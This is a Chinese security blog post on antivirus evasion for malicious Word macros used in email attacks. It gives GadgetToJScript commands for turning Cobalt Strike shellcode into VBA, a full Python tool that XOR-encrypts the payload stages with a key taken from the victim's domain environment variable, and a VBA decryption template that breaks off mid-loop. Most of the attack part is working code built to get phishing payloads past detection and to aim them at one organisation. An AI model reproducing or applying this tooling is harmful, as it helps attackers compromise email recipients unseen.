@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="主要分享思路与技术研究,既然分享出来就会被查杀,掌握了原理就不怕被杀,使用工具或看别人文章主要学习思路,而不是表面方法  免杀测试过程:  对GadgetToJScript 生成的payload 直接贴入word文档 ,发现被杀 删除部分base64 编码过的字节码,发现不会被杀,说明是base64字节码部分被杀 写工具对base64 编码部分进行xor 混淆, key字段取当前环境中环境变量特">
+<meta property="og:type" content="article">
+<meta property="og:title" content="邮件攻防--宏免杀姿势2">
+<meta property="og:url" content="http://wolvez.club/2020/12/17/macro/index.html">
+<meta property="og:site_name" content="wolvez&#39;s blog">
+<meta property="og:description" content="主要分享思路与技术研究,既然分享出来就会被查杀,掌握了原理就不怕被杀,使用工具或看别人文章主要学习思路,而不是表面方法  免杀测试过程:  对GadgetToJScript 生成的payload 直接贴入word文档 ,发现被杀 删除部分base64 编码过的字节码,发现不会被杀,说明是base64字节码部分被杀 写工具对base64 编码部分进行xor 混淆, key字段取当前环境中环境变量特">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2020-12-17T12:16:35.635Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="邮件攻防--宏免杀姿势2">
+<meta name="twitter:description" content="主要分享思路与技术研究,既然分享出来就会被查杀,掌握了原理就不怕被杀,使用工具或看别人文章主要学习思路,而不是表面方法  免杀测试过程:  对GadgetToJScript 生成的payload 直接贴入word文档 ,发现被杀 删除部分base64 编码过的字节码,发现不会被杀,说明是base64字节码部分被杀 写工具对base64 编码部分进行xor 混淆, key字段取当前环境中环境变量特">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon_wolv.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon_wolv.ico" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon_wolv.ico">
+          
+        
+    
+    <!-- title -->
+    <title>邮件攻防--宏免杀姿势2</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/ATT-CK/">Att&amp;ck</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2020/12/14/mailsec02/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://wolvez.club/2020/12/17/macro/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://wolvez.club/2020/12/17/macro/&text=邮件攻防--宏免杀姿势2"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://wolvez.club/2020/12/17/macro/&title=邮件攻防--宏免杀姿势2"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wolvez.club/2020/12/17/macro/&is_video=false&description=邮件攻防--宏免杀姿势2"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=邮件攻防--宏免杀姿势2&body=Check out this article: http://wolvez.club/2020/12/17/macro/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://wolvez.club/2020/12/17/macro/&title=邮件攻防--宏免杀姿势2"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://wolvez.club/2020/12/17/macro/&title=邮件攻防--宏免杀姿势2"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://wolvez.club/2020/12/17/macro/&title=邮件攻防--宏免杀姿势2"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://wolvez.club/2020/12/17/macro/&title=邮件攻防--宏免杀姿势2"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://wolvez.club/2020/12/17/macro/&name=邮件攻防--宏免杀姿势2&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-cobaltstrike-生成csharp-shellcode"><span class="toc-number">1.</span> <span class="toc-text">0x01 cobaltstrike 生成csharp shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-使用shellcode加载器"><span class="toc-number">2.</span> <span class="toc-text">0x02 使用shellcode加载器:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-使用GadgetToJScript-生成vba"><span class="toc-number">3.</span> <span class="toc-text">0x03 使用GadgetToJScript 生成vba</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-对GadgetToJScript-生成的payload-stage部分进行xor处理"><span class="toc-number">4.</span> <span class="toc-text">0x04 对GadgetToJScript 生成的payload stage部分进行xor处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-模板文件"><span class="toc-number">5.</span> <span class="toc-text">0x05 模板文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-宏安全相关文章推荐"><span class="toc-number">6.</span> <span class="toc-text">0x07 宏安全相关文章推荐:</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        邮件攻防--宏免杀姿势2
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">wolvez's blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2020-12-17T11:39:34.000Z" itemprop="datePublished">2020-12-17</time>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <blockquote>
+<p>主要分享思路与技术研究,既然分享出来就会被查杀,掌握了原理就不怕被杀,使用工具或看别人文章主要学习思路,而不是表面方法</p>
+</blockquote>
+<p>免杀测试过程:</p>
+<ol>
+<li>对GadgetToJScript 生成的payload 直接贴入word文档 ,发现被杀</li>
+<li>删除部分base64 编码过的字节码,发现不会被杀,说明是base64字节码部分被杀</li>
+<li>写工具对base64 编码部分进行xor 混淆, key字段取当前环境中环境变量特定的值作为解密key,一般环境是没有该环境变量的</li>
+</ol>
+<h3 id="0x01-cobaltstrike-生成csharp-shellcode"><a href="#0x01-cobaltstrike-生成csharp-shellcode" class="headerlink" title="0x01 cobaltstrike 生成csharp shellcode"></a>0x01 <code>cobaltstrike</code> 生成csharp shellcode</h3><h3 id="0x02-使用shellcode加载器"><a href="#0x02-使用shellcode加载器" class="headerlink" title="0x02 使用shellcode加载器:"></a>0x02 使用shellcode加载器:</h3><p><a href="https://gist.githubusercontent.com/3xpl01tc0d3r/ecf5e1ac09935c674a9c6939c694da13/raw/238ed3339a458ce0260f98dc18a38fdbed420457/Payload.txt" target="_blank" rel="noopener">csharp launcher</a></p>
+<h3 id="0x03-使用GadgetToJScript-生成vba"><a href="#0x03-使用GadgetToJScript-生成vba" class="headerlink" title="0x03 使用GadgetToJScript 生成vba"></a>0x03 使用<code>GadgetToJScript</code> 生成vba</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .net 3.5</span></span><br><span class="line">.\GadgetToJScript.NET3.<span class="number">5</span>.exe <span class="literal">-r</span> <span class="literal">-w</span> vba <span class="literal">-e</span> b64 <span class="literal">-c</span> <span class="string">".\Class1.cs"</span> <span class="literal">-o</span> test4</span><br><span class="line"></span><br><span class="line"><span class="comment"># .net 4.x</span></span><br><span class="line">.\GadgetToJScript.NET4.x.exe <span class="literal">-b</span> <span class="literal">-r</span> <span class="literal">-w</span> vba <span class="literal">-e</span> b64 <span class="literal">-c</span> <span class="string">".\Class1.cs"</span> <span class="literal">-o</span> test5</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x04-对GadgetToJScript-生成的payload-stage部分进行xor处理"><a href="#0x04-对GadgetToJScript-生成的payload-stage部分进行xor处理" class="headerlink" title="0x04 对GadgetToJScript 生成的payload stage部分进行xor处理"></a>0x04 对<code>GadgetToJScript</code> 生成的payload stage部分进行xor处理</h3><ol>
+<li>生成处理后的vba</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 vbaxor.py --vba payloads.vba --key wolvez.com</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>说明: 取环境变量中<code>USERDNSDOMAIN</code> 环境变量部分值(域环境才有该值)作xor 加密key<br>如环境变量中 USERDNSDOMAIN 值 <code>cn1.global.alibaba.com</code> ,取<code>alibaba.com</code> 字符串作key,实际位置可以在模板文件中调整</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_encrypt</span><span class="params">(tips, key)</span>:</span></span><br><span class="line">    ltips = len(tips)</span><br><span class="line">    lkey = len(key)</span><br><span class="line">    secret = []</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> tips:</span><br><span class="line">        <span class="keyword">if</span> num &gt;= lkey:</span><br><span class="line">            num = num % lkey</span><br><span class="line">        secret.append(chr(ord(each) ^ ord(key[num])))</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(<span class="string">""</span>.join(secret).encode(<span class="string">"utf-8"</span>)).decode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">color</span><span class="params">(string, color=None)</span>:</span></span><br><span class="line"></span><br><span class="line">    attr = []</span><br><span class="line">    <span class="comment"># bold</span></span><br><span class="line">    attr.append(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> color:</span><br><span class="line">        <span class="keyword">if</span> color.lower() == <span class="string">"red"</span>:</span><br><span class="line">            attr.append(<span class="string">'31'</span>)</span><br><span class="line">        <span class="keyword">elif</span> color.lower() == <span class="string">"green"</span>:</span><br><span class="line">            attr.append(<span class="string">'32'</span>)</span><br><span class="line">        <span class="keyword">elif</span> color.lower() == <span class="string">"blue"</span>:</span><br><span class="line">            attr.append(<span class="string">'34'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'\x1b[%sm%s\x1b[0m'</span> % (<span class="string">';'</span>.join(attr), string)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> string.strip().startswith(<span class="string">"[!]"</span>):</span><br><span class="line">            attr.append(<span class="string">'31'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'\x1b[%sm%s\x1b[0m'</span> % (<span class="string">';'</span>.join(attr), string)</span><br><span class="line">        <span class="keyword">elif</span> string.strip().startswith(<span class="string">"[+]"</span>):</span><br><span class="line">            attr.append(<span class="string">'32'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'\x1b[%sm%s\x1b[0m'</span> % (<span class="string">';'</span>.join(attr), string)</span><br><span class="line">        <span class="keyword">elif</span> string.strip().startswith(<span class="string">"[?]"</span>):</span><br><span class="line">            attr.append(<span class="string">'33'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'\x1b[%sm%s\x1b[0m'</span> % (<span class="string">';'</span>.join(attr), string)</span><br><span class="line">        <span class="keyword">elif</span> string.strip().startswith(<span class="string">"[*]"</span>):</span><br><span class="line">            attr.append(<span class="string">'34'</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'\x1b[%sm%s\x1b[0m'</span> % (<span class="string">';'</span>.join(attr), string)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convertFromTemplate</span><span class="params">(parameters, templateFile)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> open(templateFile) <span class="keyword">as</span> f:</span><br><span class="line">            src = Template(f.read())</span><br><span class="line">            result = src.substitute(parameters)</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">except</span> IOError:</span><br><span class="line">        print(color(<span class="string">"[!] Could not open or read template file [&#123;&#125;]"</span>.format(templateFile)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 获取GadgetToJScript 生成的vba文件</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.\GadgetToJScript.NET4.x.exe  -b -r -w vba -e b64 -c ".\Class1.cs" -o test5</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取base64字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getbase64</span><span class="params">(vbafile,key)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> stage_xor1</span><br><span class="line">    <span class="keyword">global</span> stage_xor2</span><br><span class="line">    f = open(vbafile, <span class="string">"rb"</span>)</span><br><span class="line">    lines = f.read()</span><br><span class="line">    vbaContent = lines.decode()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取 stage_1 base64值</span></span><br><span class="line">    stage_1 = <span class="string">''</span></span><br><span class="line">    pattern = <span class="string">r'(?P&lt;name&gt;stage_1)\s*=\s*((?P=name)\s*&amp;\s*)?"(?P&lt;payload&gt;[^"]+)"'</span></span><br><span class="line">    result = re.findall(pattern, vbaContent)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> result:</span><br><span class="line">        stage_1 += r[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取 stage_2 base64 值</span></span><br><span class="line"></span><br><span class="line">    stage_2 = <span class="string">''</span></span><br><span class="line">    pattern2 = <span class="string">r'(?P&lt;name&gt;stage_2)\s*=\s*((?P=name)\s*&amp;\s*)?"(?P&lt;payload&gt;[^"]+)"'</span></span><br><span class="line">    result2 = re.findall(pattern2, vbaContent)</span><br><span class="line">    <span class="keyword">for</span> r1 <span class="keyword">in</span> result2:</span><br><span class="line">        stage_2 += r1[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(stage_2)</span></span><br><span class="line">    <span class="comment"># 对stage_1 进行xor 混淆</span></span><br><span class="line">    <span class="comment"># vba 取环境变量:</span></span><br><span class="line">    <span class="comment"># myEnv = Environ("USERDNSDOMAIN")</span></span><br><span class="line">    <span class="comment"># myEnv = Right(myEnv, 9)</span></span><br><span class="line">    <span class="comment"># key = target.com</span></span><br><span class="line">    <span class="comment"># cmd: echo %USERDNSDOMAIN%</span></span><br><span class="line">    <span class="comment">#key = key</span></span><br><span class="line">    xor_stage_1 = xor_encrypt(stage_1, key)</span><br><span class="line">    <span class="comment"># 对 stage_2 进行 xor混淆</span></span><br><span class="line">    xor_stage_2 = xor_encrypt(stage_2, key)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重组混淆过后的stage_1 字符串</span></span><br><span class="line"></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    new_xor_stage_1 = <span class="string">''</span></span><br><span class="line">    stage_xor1 = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    new_xor_stage_1 = re.findall(<span class="string">r'.&#123;,100&#125;'</span>, xor_stage_1)</span><br><span class="line">    new_xor_stage_1 = <span class="string">'\n'</span>.join(new_xor_stage_1)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> newline <span class="keyword">in</span> new_xor_stage_1.split(<span class="string">'\n'</span>):</span><br><span class="line">        <span class="keyword">if</span> len(newline):</span><br><span class="line">            num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">                stage_xor1 += <span class="string">'stage_1 = "'</span> + newline + <span class="string">'"'</span> + <span class="string">"\n"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                stage_xor1 += <span class="string">' stage_1 = stage_1 &amp; "'</span> + newline + <span class="string">'"'</span> + <span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 重组混淆后的 stage_2 字符串</span></span><br><span class="line"></span><br><span class="line">    num2 = <span class="number">0</span></span><br><span class="line">    new_xor_stage_2 = <span class="string">''</span></span><br><span class="line">    stage_xor2 = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    new_xor_stage_2 = re.findall(<span class="string">r'.&#123;,100&#125;'</span>, xor_stage_2)</span><br><span class="line">    new_xor_stage_2 = <span class="string">'\n'</span>.join(new_xor_stage_2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> newline2 <span class="keyword">in</span> new_xor_stage_2.split(<span class="string">'\n'</span>):</span><br><span class="line">        <span class="keyword">if</span> len(newline2):</span><br><span class="line">            num2 += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> num2 == <span class="number">1</span>:</span><br><span class="line">                stage_xor2 += <span class="string">'stage_2 = "'</span> + newline2 + <span class="string">'"'</span> + <span class="string">"\n"</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                stage_xor2 += <span class="string">' stage_2 = stage_2 &amp; "'</span> + newline2 + <span class="string">'"'</span> + <span class="string">"\n"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writeVBA</span><span class="params">(resultfile)</span>:</span></span><br><span class="line">    template = <span class="string">'./templates.vba'</span></span><br><span class="line">    result = convertFromTemplate(&#123;<span class="string">'stage_xor1'</span>: stage_xor1, <span class="string">'stage_xor2'</span>: stage_xor2&#125;, template)</span><br><span class="line">    <span class="keyword">if</span> result != <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            fileName = resultfile</span><br><span class="line">            <span class="keyword">with</span> open(fileName, <span class="string">"w+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(result)</span><br><span class="line">                f.close()</span><br><span class="line">                print(color(<span class="string">"[+] VBA code file saved in [&#123;&#125;]"</span>.format(fileName)))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            print(color(<span class="string">"[!] Could not write VBA code  [&#123;&#125;]"</span>.format(fileName)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">"VBA XOR encrypt version 1.0 by wolvez"</span>,</span><br><span class="line">                                     epilog=<span class="string">'Example :\n1. .\GadgetToJScript.NET4.x.exe  -b -r -w vba -e b64 -c ".\Class1.cs" -o test\n2. vbaxor.py --vba test.vba -o serialize.vba'</span>)</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">"--vba"</span>, help=<span class="string">"input vba file"</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--key"</span>, help=<span class="string">"Victim System environment variables "</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">"--out-file"</span>, <span class="string">'-o'</span>, dest=<span class="string">'outfile'</span>,default=<span class="string">'./serialize.vba'</span>, help=<span class="string">"output vba file"</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    vba = args.vba</span><br><span class="line">    key = args.key</span><br><span class="line">    outfile = args.outfile</span><br><span class="line">    getbase64(vba, key)</span><br><span class="line">    writeVBA(outfile)</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x05-模板文件"><a href="#0x05-模板文件" class="headerlink" title="0x05 模板文件"></a>0x05 模板文件</h3><p><code>templates.vba</code></p>
+<pre><code class="vb"><span class="keyword">Function</span> XorC(<span class="keyword">ByVal</span> sData <span class="keyword">As</span> <span class="built_in">String</span>, <span class="keyword">ByVal</span> sKey <span class="keyword">As</span> <span class="built_in">String</span>) <span class="keyword">As</span> <span class="built_in">String</span>
+
+        <span class="keyword">Dim</span> l <span class="keyword">As</span> <span class="built_in">Long</span>, i <span class="keyword">As</span> <span class="built_in">Long</span>, byIn() <span class="keyword">As</span> <span class="built_in">Byte</span>, byOut() <span class="keyword">As</span> <span class="built_in">Byte</span>, byKey() <span class="keyword">As</span> <span class="built_in">Byte</span>
+        <span class="keyword">Dim</span> bEncOrDec <span class="keyword">As</span> <span class="built_in">Boolean</span>
+        <span class="keyword">Dim</span> addVal
+
+        <span class="keyword">If</span> Len(sData) = <span class="number">0</span> <span class="keyword">Or</span> Len(sKey) = <span class="number">0</span> <span class="keyword">Then</span> XorC = <span class="string">"Invalid argument(s) used"</span>: <span class="keyword">Exit</span> <span class="keyword">Function</span>
+
+        <span class="keyword">If</span> Left(sData, <span class="number">3</span>) = <span class="string">"xxx"</span> <span class="keyword">Then</span>
+            bEncOrDec = <span class="literal">False</span> <span class="comment">'decryption</span>
+            sData = <span class="keyword">Mid</span>(sData, <span class="number">4</span>)
+        <span class="keyword">Else</span>
+            bEncOrDec = <span class="literal">True</span> <span class="comment">'encryption</span>
+        <span class="keyword">End</span> <span class="keyword">If</span>
+
+        byIn = sData
+        byOut = sData
+        byKey = sKey
+
+        <span class="keyword">If</span> bEncOrDec = <span class="literal">True</span> <span class="keyword">Then</span>
+            addVal = <span class="number">32</span>
+        <span class="keyword">Else</span>
+            addVal = <span class="number">1</span> * <span class="number">-32</span>
+        <span class="keyword">End</span> <span class="keyword">If</span>
+
+        l = LBound(byKey)
+
+        <span class="keyword">For</span> i = LBound(byIn) <span class="keyword">To</span> UBound(byIn) - <span class="number">1</span> <span class="keyword">Step</span> <span class="number">2</span>
+
+            <span class="keyword">If</span> (((byIn(i) + <span class="keyword">Not</span> bEncOrDec) <span class="keyword">Xor</span> byKey(l)) + addVal) &gt; <span class="number">255</span> <span class="keyword">Then</span>
+                byOut(i) = (((byIn(i) + <span class="keyword">Not</span> bEncOrDec) <span class="keyword">Xor</span> byKey(l)) + addVal) <span class="keyword">Mod</span> <span class="number">255</span> + addVal
+            <span class="keyword">Else</span>
+                <span class="comment">'If bEncOrDec Then</span>
+                <span class="keyword">If</span> ((byIn(i) + <span class="keyword">Not</span> bEncOrDec) <span class="keyword">Xor</span> byKey(l)) - addVal &lt; <span class="number">32</span> <span class="keyword">Then</span> byOut(i) = ((byIn(i) + <span class="keyword">Not</span> bEncOrDec) <span class="keyword">Xor</span> byKey(l)) + addVal
+                <span class="keyword">If</span> ((byIn(i) + <span class="keyword">Not</span> bEncOrDec) <span class="keyword">Xor</span> byKey(l)) - addVal &gt; <span class="number">255</span> <span class="keyword">Then</span> byOut(i) = ((byIn(i) + <span class="keyword">Not</span> bEncOrDec) <span class="keyword">Xor</span> byKey(l)) - addVal
+                <span class="keyword">If</span> ((byIn(i) + <span class="keyword">Not</span> bEncOrDec) <span class="keyword">Xor</span> byKey(l)) &gt; <span class="number">32</span> <span class="keyword">And</span> (byIn(i) + <span class="keyword">Not</span> bEncOrDec) <span class="keyword">Xor</span> byKey(l) &lt; <span class="number">256</span> <span class="keyword">Then</span> byOut(i) = ((byIn(i) + <span class="keyword">Not</span> bEncOrDec) <span class="keyword">Xor</span> byKey(l))
+            <span class="keyword">End</span> <span class="keyword">If</span>
+            l = l + <span class="number">2</span>
+
